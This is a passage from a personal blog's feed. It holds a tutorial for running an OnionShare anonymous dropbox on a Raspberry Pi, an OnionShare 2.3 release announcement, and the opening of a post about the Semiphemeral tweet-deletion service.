sudo apt upgrade -y
&lt;/pre&gt;&lt;h2 id="install-onionshare"&gt;Install OnionShare&lt;/h2&gt;&lt;p&gt;OnionShare is written in python, and you can install the &lt;a href="https://docs.onionshare.org/2.3.1/en/advanced.html#command-line-interface"&gt;command line version&lt;/a&gt; use python's package manager &lt;code&gt;pip&lt;/code&gt;. So first, I must install &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;
sudo apt install python3-pip
&lt;/pre&gt;&lt;p&gt;Now I'm going to install OnionShare itself:&lt;/p&gt;
&lt;pre&gt;
pip3 install --user onionshare-cli
&lt;/pre&gt;&lt;p&gt;When you install programs with &lt;code&gt;pip&lt;/code&gt; and use the &lt;code&gt;--user&lt;/code&gt; flag, it installs them into &lt;code&gt;~/.local/bin&lt;/code&gt;, which isn't in your path by default. This will add &lt;code&gt;~/.local/bin&lt;/code&gt; to your path automatically for the next time you SSH into your Pi:&lt;/p&gt;
&lt;pre&gt;
echo "PATH=\$PATH:~/.local/bin" &gt;&gt; ~/.bashrc
source ~/.bashrc
&lt;/pre&gt;&lt;p&gt;Okay, now try running &lt;code&gt;onionshare-cli&lt;/code&gt;. You should see the usage information:&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-usage.png" alt=""&gt;&lt;/p&gt;
&lt;h2 id="test-it-out-install-tor"&gt;Test it out (install tor)&lt;/h2&gt;&lt;p&gt;Great, so let's start by seeing if we can run a chat server:&lt;/p&gt;
&lt;pre&gt;
$ onionshare-cli --chat
OnionShare 2.3.1 | https://onionshare.org/

                     @@@@@@@@@                      
                @@@@@@@@@@@@@@@@@@@                 
             @@@@@@@@@@@@@@@@@@@@@@@@@              
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ___        _               
               @@@@@@         @@@@@@@@@@@@@         / _ \      (_)              
         @@@@    @               @@@@@@@@@@@       | | | |_ __  _  ___  _ __    
       @@@@@@@@                   @@@@@@@@@@       | | | | '_ \| |/ _ \| '_ \   
     @@@@@@@@@@@@                  @@@@@@@@@@      \ \_/ / | | | | (_) | | | |  
   @@@@@@@@@@@@@@@@                 @@@@@@@@@       \___/|_| |_|_|\___/|_| |_|  
      @@@@@@@@@                 @@@@@@@@@@@@@@@@    _____ _                     
      @@@@@@@@@@                  @@@@@@@@@@@@     /  ___| |                    
       @@@@@@@@@@                   @@@@@@@@       \ `--.| |__   __ _ _ __ ___ 
       @@@@@@@@@@@               @    @@@@          `--. \ '_ \ / _` | '__/ _ \
        @@@@@@@@@@@@@         @@@@@@               /\__/ / | | | (_| | | |  __/
         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@             \____/|_| |_|\__,_|_|  \___|
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
             @@@@@@@@@@@@@@@@@@@@@@@@@              
                @@@@@@@@@@@@@@@@@@@                 
                     @@@@@@@@@                      

You must install tor to use OnionShare from the command line
&lt;/pre&gt;&lt;p&gt;Oh right, I need to install tor. That's easy:&lt;/p&gt;
&lt;pre&gt;
sudo apt install tor
&lt;/pre&gt;&lt;p&gt;Okay, let's try again:&lt;/p&gt;
&lt;pre&gt;
$ onionshare-cli --chat
OnionShare 2.3.1 | https://onionshare.org/

                     @@@@@@@@@                      
                @@@@@@@@@@@@@@@@@@@                 
             @@@@@@@@@@@@@@@@@@@@@@@@@              
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ___        _               
               @@@@@@         @@@@@@@@@@@@@         / _ \      (_)              
         @@@@    @               @@@@@@@@@@@       | | | |_ __  _  ___  _ __    
       @@@@@@@@                   @@@@@@@@@@       | | | | '_ \| |/ _ \| '_ \   
     @@@@@@@@@@@@                  @@@@@@@@@@      \ \_/ / | | | | (_) | | | |  
   @@@@@@@@@@@@@@@@                 @@@@@@@@@       \___/|_| |_|_|\___/|_| |_|  
      @@@@@@@@@                 @@@@@@@@@@@@@@@@    _____ _                     
      @@@@@@@@@@                  @@@@@@@@@@@@     /  ___| |                    
       @@@@@@@@@@                   @@@@@@@@       \ `--.| |__   __ _ _ __ ___ 
       @@@@@@@@@@@               @    @@@@          `--. \ '_ \ / _` | '__/ _ \
        @@@@@@@@@@@@@         @@@@@@               /\__/ / | | | (_| | | |  __/
         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@             \____/|_| |_|\__,_|_|  \___|
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
             @@@@@@@@@@@@@@@@@@@@@@@@@              
                @@@@@@@@@@@@@@@@@@@                 
                     @@@@@@@@@                      

Connecting to the Tor network: 100% - Done

Give this address to the recipient:
http://onionshare:appetizer-acid@hhzxxzfsx34ckxjtl3z6cjgfk73tyr3fxbsu3rumiqsgdz6nvmorhnyd.onion

Press Ctrl+C to stop the server
&lt;/pre&gt;&lt;p&gt;Load the OnionShare address you see in Tor Browser to make sure it works.&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-chat.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Great.&lt;/p&gt;
&lt;p&gt;Press Ctrl-C to quit OnionShare.&lt;/p&gt;
&lt;h2 id="start-a-persistent-anonymous-dropbox"&gt;Start a persistent anonymous dropbox&lt;/h2&gt;&lt;p&gt;To let people anonymously upload files to your computer (in this case, your Raspberry Pi) you use &lt;a href="https://docs.onionshare.org/2.3.1/en/features.html#receive-files"&gt;receive mode&lt;/a&gt;. In the command line this is the &lt;code&gt;--receive&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;You'll also want to make sure you use &lt;code&gt;--persistent&lt;/code&gt;. This will save the Tor onion key into a file so that if you ever, for example, reboot your Raspberry Pi, you can start up your service with the exact same OnionShare address.&lt;/p&gt;
&lt;p&gt;You'll also probably want to use &lt;code&gt;--public&lt;/code&gt; which disables the default password protection. Basically, this lets you post a link to your anonymous dropbox &lt;a href="https://twitter.com/kenklippenstein/status/1363744555435249665"&gt;on Twitter&lt;/a&gt; (for example) and anyone can go there to anonymously leak documents to you.&lt;/p&gt;
&lt;p&gt;Putting it all together:&lt;/p&gt;
&lt;pre&gt;
$ onionshare-cli --receive --persistent ~/anon-dropbox.session --public
OnionShare 2.3.1 | https://onionshare.org/

                     @@@@@@@@@                      
                @@@@@@@@@@@@@@@@@@@                 
             @@@@@@@@@@@@@@@@@@@@@@@@@              
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ___        _               
               @@@@@@         @@@@@@@@@@@@@         / _ \      (_)              
         @@@@    @               @@@@@@@@@@@       | | | |_ __  _  ___  _ __    
       @@@@@@@@                   @@@@@@@@@@       | | | | '_ \| |/ _ \| '_ \   
     @@@@@@@@@@@@                  @@@@@@@@@@      \ \_/ / | | | | (_) | | | |  
   @@@@@@@@@@@@@@@@                 @@@@@@@@@       \___/|_| |_|_|\___/|_| |_|  
      @@@@@@@@@                 @@@@@@@@@@@@@@@@    _____ _                     
      @@@@@@@@@@                  @@@@@@@@@@@@     /  ___| |                    
       @@@@@@@@@@                   @@@@@@@@       \ `--.| |__   __ _ _ __ ___ 
       @@@@@@@@@@@               @    @@@@          `--. \ '_ \ / _` | '__/ _ \
        @@@@@@@@@@@@@         @@@@@@               /\__/ / | | | (_| | | |  __/
         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@             \____/|_| |_|\__,_|_|  \___|
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
             @@@@@@@@@@@@@@@@@@@@@@@@@              
                @@@@@@@@@@@@@@@@@@@                 
                     @@@@@@@@@                      

Connecting to the Tor network: 100% - Done
 * Running on http://127.0.0.1:17636/ (Press CTRL+C to quit)

Files sent to you appear in this folder: /home/ubuntu/OnionShare

Warning: Receive mode lets people upload files to your computer. Some files can potentially take control of your computer if you open them. Only open things from people you trust, or if you know what you are doing.

Give this address to the sender:
http://vxat6yszh7o5r2fxzvibxsb4lmfi6yzudobn3o3yz2vhvue3z2xmbqid.onion

Press Ctrl+C to stop the server
&lt;/pre&gt;&lt;p&gt;Now, load the OnionShare address in Tor Browser to make sure it works.&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-receive.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;It works!&lt;/p&gt;
&lt;p&gt;And live web logs get displayed in the terminal as well. For example when I loaded the OnionShare address, this was displayed in the terminal:&lt;/p&gt;
&lt;pre&gt;
127.0.0.1 - - [24/Feb/2021 02:36:06] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2021 02:36:07] "GET /static_nwr7jepc7gzurz2tyf2ddqnaxe/css/style.css HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2021 02:36:08] "GET /static_nwr7jepc7gzurz2tyf2ddqnaxe/js/jquery-3.5.1.min.js HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2021 02:36:08] "GET /static_nwr7jepc7gzurz2tyf2ddqnaxe/js/receive.js HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2021 02:36:08] "GET /static_nwr7jepc7gzurz2tyf2ddqnaxe/img/logo.png HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2021 02:36:08] "GET /static_nwr7jepc7gzurz2tyf2ddqnaxe/img/logo_large.png HTTP/1.1" 200 -
127.0.0.1 - - [24/Feb/2021 02:36:09] "GET /static_nwr7jepc7gzurz2tyf2ddqnaxe/img/favicon.ico HTTP/1.1" 200 -
&lt;/pre&gt;&lt;p&gt;You'll never get to know the IP addresses of people who visit your onion site. Their IP will always look like &lt;code&gt;127.0.0.1&lt;/code&gt;. This is how Tor onion services work: you run a service anonymously, and all the clients that connect to your service are anonymous as well. If someone loads your anonymous dropbox while you happen to be looking at the terminal, you'll be able to tell that someone is there because you'll see the logs they generate, but you won't know who it is.&lt;/p&gt;
&lt;h2 id="upload-a-file-and-then-see-what-was-uploaded"&gt;Upload a file, and then see what was uploaded&lt;/h2&gt;&lt;p&gt;Now, let's try uploading a file. In my case, I'm uploading a ~2.6mb file called &lt;code&gt;IMG_0417.jpg&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In the terminal you can see the progress of the file as it uploads, and then you can see the location it was saved to:&lt;/p&gt;
&lt;pre&gt;
=&gt; 2.5 MiB IMG_0417.jpg             
Received: /home/ubuntu/OnionShare/2021-02-24/22.29.20/IMG_0417.jpg
127.0.0.1 - - [24/Feb/2021 22:29:29] "POST /upload-ajax HTTP/1.1" 200 -
&lt;/pre&gt;&lt;p&gt;But now, how do I actually access this file? There are many ways. Here are some options:&lt;/p&gt;
&lt;h3 id="in-macos-or-windows"&gt;In macOS or Windows&lt;/h3&gt;&lt;p&gt;If you use macOS or Windows you can use SFTP software like &lt;a href="https://cyberduck.io/"&gt;Cyberduck&lt;/a&gt;. For example, here I'm setting up a new connection in Cyberduck called &lt;code&gt;onionsharepi&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src="cyberduck1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Then when I connect to it, I can browse the files and download anything to my computer:&lt;/p&gt;
&lt;p&gt;&lt;img src="cyberduck2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;And finally, I can open &lt;code&gt;IMG_0417.jpg&lt;/code&gt; and see what this image I uploaded was.&lt;/p&gt;
&lt;p&gt;&lt;img src="tor-mask.png" alt=""&gt;&lt;/p&gt;
&lt;h3 id="in-linux"&gt;In Linux&lt;/h3&gt;&lt;p&gt;In Ubuntu (or other distros that use nautilus as the file manager), I open the file manager, go to "Other Locations", and connect to the server &lt;code&gt;sftp://ubuntu@192.168.1.46/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu-files1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now I have access to the files that get uploaded to my anonymous dropbox:&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu-files2.png" alt=""&gt;&lt;/p&gt;
&lt;h2 id="make-sure-the-anonymous-dropbox-is-actually-persistent"&gt;Make sure the anonymous dropbox is actually persistent&lt;/h2&gt;&lt;p&gt;The command we used to start OnionShare in receive mode is:&lt;/p&gt;
&lt;pre&gt;
onionshare-cli --receive --persistent ~/anon-dropbox.session --public
&lt;/pre&gt;&lt;p&gt;This stores all the settings associated with this session, including the secret key required to get this same Tor onion address, in the file &lt;code&gt;anon-dropbox.session&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If you quit OnionShare by pressing Ctrl-C, then run that same command over again (in the terminal press up arrow, then enter), it should start OnionShare again, and the URL should be exactly the same. This is important because if you ever have to quit OnionShare (like maybe you need to unplug the Raspberry Pi and plug it in somewhere else, forcing it to reboot), you'll be able to get your anonymous dropbox up and running again with the same address.&lt;/p&gt;
&lt;p&gt;...and yup, I just confirmed persistence works on my end.&lt;/p&gt;
&lt;p&gt;You may wish to copy and paste the contents of this file into a note field in your password manager, or otherwise make a secure backup of it. This way when you spill coffee all over your Raspberry Pi, you can get up and running again without too much trouble.&lt;/p&gt;
&lt;h2 id="run-onionshare-in-a-screen-session-so-you-can-close-your-terminal"&gt;Run OnionShare in a screen session so you can close your terminal&lt;/h2&gt;&lt;p&gt;So far this works great, but there's a big problem: When you SSH into a remote server (the Pi) and run a command (&lt;code&gt;onionshare-cli&lt;/code&gt;), if you close your terminal, get disconnected from wifi, or otherwise end your SSH session, it will close &lt;code&gt;onionshare-cli&lt;/code&gt; as well. Ideally you want it to just always be open and running in the background.&lt;/p&gt;
&lt;p&gt;A simple way of doing this is using the program &lt;code&gt;screen&lt;/code&gt;, a terminal multiplexer (you can also use &lt;code&gt;tmux&lt;/code&gt; or whatever else you prefer). If OnionShare is running on your Raspberry Pi, quit it with Ctrl-C. Then from a terminal, install screen and download a simple &lt;code&gt;.screenrc&lt;/code&gt; file so it will look a bit nicer:&lt;/p&gt;
&lt;pre&gt;
sudo apt install -y screen
wget https://raw.githubusercontent.com/micahflee/dotfiles/master/.screenrc
&lt;/pre&gt;&lt;p&gt;Then run &lt;code&gt;screen&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;
screen
&lt;/pre&gt;&lt;p&gt;You should see a new bar at the bottom of the screen with &lt;code&gt;0 bash&lt;/code&gt; highlighted in yellow. This means you're inside a screen session now. (If you want to get nerdy, you may with to teach yourself more about using &lt;code&gt;screen&lt;/code&gt; or similar terminal multiplexers.)&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Now&lt;/em&gt; run &lt;code&gt;onionshare-cli&lt;/code&gt; again:&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-screen.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now go ahead and completely close out of the terminal window, and make sure your you can still load your OnionShare address. It should load fine, because &lt;code&gt;onionshare-cli&lt;/code&gt; should still be running on the Pi in your &lt;code&gt;screen&lt;/code&gt; session.&lt;/p&gt;
&lt;p&gt;Now let's get back in. Open a new terminal and SSH back into the Pi:&lt;/p&gt;
&lt;pre&gt;
ssh ubuntu@192.168.1.46
&lt;/pre&gt;&lt;p&gt;Once you're in, reconnect your &lt;code&gt;screen&lt;/code&gt; session:&lt;/p&gt;
&lt;pre&gt;
screen -x
&lt;/pre&gt;&lt;p&gt;You should see your OnionShare anonymous dropbox again.&lt;/p&gt;
&lt;h2 id="some-final-thoughts"&gt;Some final thoughts&lt;/h2&gt;&lt;p&gt;After following this guide, you should have:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A Raspberry Pi with Ubuntu Server 20.04 installed on it&lt;/li&gt;
&lt;li&gt;The ability to SSH into the server to remotely configure it&lt;/li&gt;
&lt;li&gt;An OnionShare anonymous dropbox running in a screen session&lt;/li&gt;
&lt;li&gt;The ability to access all the files that get uploaded to your anonymous dropbox on your normal computer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Congratulations! You're now equipped to accept leaks from the public. Just let people know that they can load your OnionShare address in Tor Browser to send you stuff anonymously. Here are a few things to keep in mind:&lt;/p&gt;
&lt;p&gt;You can keep an eye on it by keeping a terminal open with the &lt;code&gt;screen&lt;/code&gt; session attached to see when people access it, and regularly checking on the files that get uploaded.&lt;/p&gt;
&lt;p&gt;Now that you're running a server, it's a good idea to regularly install updates so it doesn't get hacked, and keep an eye out for OnionShare updates as well (you'll be able to update &lt;code&gt;onionshare-cli&lt;/code&gt; by running &lt;code&gt;pip3 install --upgrade onionshare-cli&lt;/code&gt;). You might also want to do other things to harden your server like start using SSH keys instead of passwords or set up a firewall.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Your Raspberry Pi's hard drive is not encrypted, which means if someone can physically access your Pi, they can simply unplug the microSD card, plug it into their own computer, and copy all of the documents people have uploaded to you.&lt;/strong&gt; The best solution is to add disk encryption to this setup (perhaps this will be the target of a future blog post -- if you're interested in that, post in the comments). But in the meantime, whenever someone sends you anything sensitive, you can download it to your computer and then delete it from the Raspberry Pi, and &lt;em&gt;then&lt;/em&gt; securely erase the free space on the Pi's microSD card so that it can't be recovered.&lt;/p&gt;
&lt;p&gt;To securely delete free space, install the &lt;code&gt;secure-delete&lt;/code&gt; package:&lt;/p&gt;
&lt;pre&gt;
sudo apt install secure-delete
&lt;/pre&gt;&lt;p&gt;And then run &lt;code&gt;sfill&lt;/code&gt; to fill up all of the free space from zeros:&lt;/p&gt;
&lt;pre&gt;
sudo sfill -v -l /
&lt;/pre&gt;&lt;p&gt;In this command I'm using the flag &lt;code&gt;-l&lt;/code&gt; which means "lessens the security. Only two passes are written: one mode with 0xff and a final mode with random values." -- though honestly I think this is fine for almost every use-case. This will take a very long time as it is, but if you leave off the &lt;code&gt;-l&lt;/code&gt; it will take about 19 times longer, overwriting your free space 38 times instead of 2 times. (Run &lt;code&gt;man sfill&lt;/code&gt; for more information.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Warning: Receive mode lets people upload files to your computer. Some files can potentially take control of your computer if you open them. Only open things from people you trust, or if you know what you are doing.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This warning is prominently displayed in OnionShare, and I think it's important to point out again. Just like why you're instructed not to open sketchy email attachments, you shouldn't just blindly open documents that you receive from OnionShare. For a trivial example, if you use Windows someone can send you &lt;code&gt;backdoor.exe&lt;/code&gt;, and if you open that file, they will have hacked you.&lt;/p&gt;
&lt;p&gt;If you do get a document and you're worried it might hack you when you open it, here are a few strategies to try:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If it's an office document, run it through &lt;a href="https://dangerzone.rocks/"&gt;Dangerzone&lt;/a&gt; first. This is another piece of software I wrote that turns office documents into PDFs that you can be confident won't hack you.&lt;/li&gt;
&lt;li&gt;If you're not concerned with sharing it with third parties:&lt;ul&gt;
&lt;li&gt;You can upload it to &lt;a href="https://www.virustotal.com/"&gt;VirusTotal&lt;/a&gt; to get it scanned by dozens of anti-virus programs, which might help inform if you want to open it or not.&lt;/li&gt;
&lt;li&gt;You can also upload certain types of documents (including office docs, videos, and audio files) to Google Drive, and then view them in your web browser instead of programs like Word or VLC. If these documents would try to hack you, they'll instead try to hack some container running on Google's infrastructure, letting you view it safely.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Set up a &lt;a href="https://theintercept.com/2015/09/16/getting-hacked-doesnt-bad/"&gt;virtual machine&lt;/a&gt;, turn networking off, copy the document to your VM, and open it there. If it's malicious it will try to hack your VM instead of your host computer, and if it tries to phone home it will fail because your VM doesn't have networking.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Good luck, and I'd love to know if you're running an OnionShare anonymous dropbox of your own.&lt;/p&gt;
&lt;p&gt;Oh and if you have any newsworthy leaks, feel free to send them my way: &lt;a href="http://vxat6yszh7o5r2fxzvibxsb4lmfi6yzudobn3o3yz2vhvue3z2xmbqid.onion"&gt;http://vxat6yszh7o5r2fxzvibxsb4lmfi6yzudobn3o3yz2vhvue3z2xmbqid.onion&lt;/a&gt;&lt;/p&gt;
</content></entry><entry><title>OnionShare 2.3 adds tabs, anonymous chat, better command line support, and quite a bit more</title><link href="https://micahflee.com/2021/02/onionshare-tabs-anonymous-chat-cli/" rel="alternate"></link><updated>2021-02-21T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:5d08bd73-57ff-361e-bcfd-79e861ddba88</id><content type="html">&lt;p&gt;After a ridiculously long sixteen months (or roughly ten years in pandemic time) I'm excited to announce that OnionShare 2.3 is out! Download it from &lt;a href="https://onionshare.org/"&gt;onionshare.org&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This version includes loads of new and exciting features which you can read about in much more detail on the brand new OnionShare documentation website, &lt;a href="https://docs.onionshare.org/"&gt;docs.onionshare.org&lt;/a&gt;. For now though I'm just going to go over the major ones: tabs, anonymous chat, and better command line support.&lt;/p&gt;
&lt;h2 id="doing-all-the-things-at-once"&gt;Doing all the things at once&lt;/h2&gt;&lt;p&gt;In the olden days, OnionShare only did one thing: let you securely and anonymously share files over the Tor network. With time we added new features. You could use it as an &lt;a href="https://micahflee.com/2019/02/onionshare-2/"&gt;anonymous dropbox&lt;/a&gt;, and then later to &lt;a href="https://micahflee.com/2019/10/new-version-of-onionshare-makes-it-easy-for-anyone-to-publish-anonymous-uncensorable-websites/"&gt;host an onion site&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;But what if you wanted to, for example, run your own anonymous dropbox &lt;em&gt;as well as&lt;/em&gt; share files with someone? If your OnionShare was busy running a service, you couldn't run a second service without stopping the first service. This is all fixed now thanks to tabs.&lt;/p&gt;
&lt;p&gt;&lt;img src="tabs.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now when you open OnionShare you are presented with a blank tab that lets you choose between sharing files, receiving files, hosting a website, or chatting anonymous. You can have as many tabs open as you want at a time, and you can easily save tabs (that's what the purple thumbtack in the tab bar means) so that if you quit OnionShare and open it again later, these services can start back up with the same OnionShare addresses.&lt;/p&gt;
&lt;p&gt;So with OnionShare 2.3 you can host a few websites, have your own personal anonymous dropbox, and securely send files to people whenever you want, all at the same time. Under the hood, the addition of tabs also makes OnionShare connect to the Tor network faster, especially if you're using a bridge.&lt;/p&gt;
&lt;h2 id="secure-anonymous-ephemeral-chat-rooms-that-don-t-log-anything"&gt;Secure, anonymous, ephemeral chat rooms that don't log anything&lt;/h2&gt;&lt;p&gt;Another major new feature is chat. You start a chat service, it gives you an OnionShare address, and then you send this address to everyone who is invited to the chat room (using an encrypted messaging app like Signal, for example). Then everyone loads this address in a &lt;a href="https://www.torproject.org/"&gt;Tor Browser&lt;/a&gt;, makes up a name to go by, and can have a completely private conversation.&lt;/p&gt;
&lt;p&gt;&lt;img src="chat-torbrowser.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;If you're already using an encrypted messaging app, what’s the point of an OnionShare chat room? It leaves fewer traces.&lt;/p&gt;
&lt;p&gt;If, for example, you send a message to a Signal group, a copy of your message ends up on each device (the devices, and computers if they set up Signal Desktop of each member of the group). Even if disappearing messages is turned on it’s hard to confirm all copies of the messages are actually deleted from all devices, and from any other places (like notifications databases) they may have been saved to. OnionShare chat rooms don’t store any messages anywhere, so the problem is reduced to a minimum.&lt;/p&gt;
&lt;p&gt;OnionShare chat rooms can also be useful for people wanting to chat anonymously and securely with someone without needing to create any accounts. For example, a whistleblower can send an OnionShare address to a journalist using a disposable e-mail address, and then wait for the journalist to join the chat room, all without compromising their anonymity.&lt;/p&gt;
&lt;p&gt;Because OnionShare relies on Tor onion services, connections between the Tor Browser and OnionShare are all end-to-end encrypted (E2EE). When someone posts a message to an OnionShare chat room, they send it to the server through their E2EE onion connection. The OnionShare server then forwards the message to all other members of the chat room through the other members' E2EE onion connections, using WebSockets. OnionShare doesn’t implement any chat encryption on its own. It relies on the Tor onion service’s encryption instead.&lt;/p&gt;
&lt;p&gt;Huge thanks to &lt;a href="https://twitter.com/Saptak013"&gt;Saptak Sengupta&lt;/a&gt; for developing the anonymous chat feature (doing the bulk of the work in like a single day (!), in the midst of a hacker con in Goa, India last March).&lt;/p&gt;
&lt;h2 id="onionshare-from-the-command-line"&gt;OnionShare from the command line&lt;/h2&gt;&lt;p&gt;&lt;img src="cli.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;OnionShare 2.3 finally de-couples the command line and the graphical versions. You can install &lt;code&gt;onionshare-cli&lt;/code&gt; on any platform, including headless Linux servers, &lt;a href="https://pypi.org/project/onionshare-cli/"&gt;using pip&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;
pip3 install --user onionshare-cli
&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;You also need to have &lt;code&gt;tor&lt;/code&gt; installed to use it from your package manager, or Homebrew if you're using macOS.&lt;/p&gt;
&lt;p&gt;It's simple to use. For example, here's how you start a chat server:&lt;/p&gt;
&lt;p&gt;&lt;img src="cli-chat.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;I hope you enjoy the new version of OnionShare!&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note February 21, 2021: OnionShare 2.3 for Linux will be available in &lt;a href="https://flathub.org/"&gt;Flathub&lt;/a&gt; after &lt;a href="https://github.com/flathub/flathub/pull/2129"&gt;this pull request&lt;/a&gt; is reviewed and merged, so hang tight. In the meantime, it's already &lt;a href="https://snapcraft.io/onionshare"&gt;available in Snapcraft&lt;/a&gt; (though it logs analytics), or you can install the &lt;code&gt;.flatpak&lt;/code&gt; file directly from &lt;a href="https://onionshare.org/dist/2.3/"&gt;onionshare.org/dist/2.3&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Update February 22, 2022: Version 2.3 had a bug where chat was broken :( but we just released version 2.3.1 which fixes it! :).&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Update February 23, 2020: The Flatpak package is live! Linux users &lt;a href="https://flathub.org/apps/details/org.onionshare.OnionShare"&gt;get it from Flathub&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
</content></entry><entry><title>Easily automate deleting your old tweets, likes, and DMs with Semiphemeral</title><link href="https://micahflee.com/2020/09/semiphemeral-automate-deleting-your-old-tweets-likes-and-direct-messages/" rel="alternate"></link><updated>2020-09-10T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:2b124782-f5df-3d96-be26-aed14d4ee207</id><content type="html">&lt;p&gt;Roughly one hundred years ago, in June of 2019, &lt;a href="https://micahflee.com/2019/06/semiphemeral-automatically-delete-your-old-tweets-except-for-the-ones-you-want-to-keep/"&gt;I released&lt;/a&gt; an &lt;a href="https://github.com/micahflee/semiphemeral"&gt;open source&lt;/a&gt; Twitter privacy tool called Semiphemeral that makes it simple-ish to delete years of old tweets. The great thing about Semiphemeral is, unlike similar tools, it's flexible: you don't have to delete &lt;em&gt;all&lt;/em&gt; of your old tweets if you don't want to. You can, say, choose to keep tweets that have at least 20 likes, flag specific tweets you want to never delete, or delete all your retweets and likes that are older than a week.&lt;/p&gt;
&lt;p&gt;But at the time, Semiphemeral was only usable by the nerdiest among us. It required running commands in a terminal window, creating your own Twitter API key, and, if you want to automate it, setting up a cron job on a server. But this is no longer the case!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;For the last several months I've been running an easy-to-use hosted version at &lt;a href="https://semiphemeral.com/"&gt;Semiphemeral.com&lt;/a&gt;. Now &lt;em&gt;anyone*&lt;/em&gt; can easily delete their old tweets, likes, and now even direct messages (more on this below).&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="screenshot.png" alt=""&gt;&lt;/p&gt;
&lt;h1 id="semiphemeral-is-an-antifascist-service"&gt;Semiphemeral is an antifascist service&lt;/h1&gt;&lt;p&gt;*Well, &lt;em&gt;most people&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;In order to use Semiphemeral, you must follow &lt;a href="https://twitter.com/semiphemeral"&gt;@semiphemeral&lt;/a&gt; on Twitter. Supporters of dictators and anti-democratic demagogues, racists, or other types of fascists will be blocked, and blocked users are ineligible to use Semiphemeral. Everyone deserves privacy on social media, but not everyone is entitled to get that privacy by using this free service.&lt;/p&gt;
&lt;p&gt;How does fascist detection work? Right now it's fairly simple. Semiphemeral maintains a list of popular fascist Twitter influencers: extremist demagogues like Trump in the US, Bolsonaro in Brazil, or Modi in India; popular neo-Nazi media personalities like Tucker Carlson or Ben Shapiro; and others.&lt;/p&gt;
&lt;p&gt;When you start using Semiphemeral it downloads a history of your tweets and likes. If you've liked tweets from any of those fascists within the last few months, you get automatically blocked and are disqualified from using the service (it automatically unblocks you in a few months, in case you've changed since then).&lt;/p&gt;
&lt;p&gt;This algorithm is prone to false positives, of course. Many perfectly reasonable people have at one point liked a Trump tweet, for whatever reason. So if you get blocked and you've only liked a few fascist tweets, Semiphemeral will let you unblock yourself and continue using the service. But if you've demonstrated a clear pattern of liking what fascists are spewing on Twitter, you have to write an email if you want to appeal your block.&lt;/p&gt;
&lt;h1 id="getting-started"&gt;Getting started&lt;/h1&gt;&lt;p&gt;Using the hosted Semiphemeral service is easy. Just go to &lt;a href="https://semiphemeral.com/"&gt;https://semiphemeral.com/&lt;/a&gt; and click "Login with Twitter". This will ask you to give Semiphemeral.com permission to delete your tweets and likes.&lt;/p&gt;
&lt;p&gt;&lt;img src="twitter-auth.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;As soon as you create your account, Semiphemeral starts downloading a history of your tweets. Depending on how long you've been using Twitter, this may take a long time. Twitter enforces &lt;a href="https://developer.twitter.com/ja/docs/basics/rate-limits"&gt;rate limits&lt;/a&gt;, which means Semiphemeral will frequently have to stop and wait 15 minutes before it can continue.&lt;/p&gt;
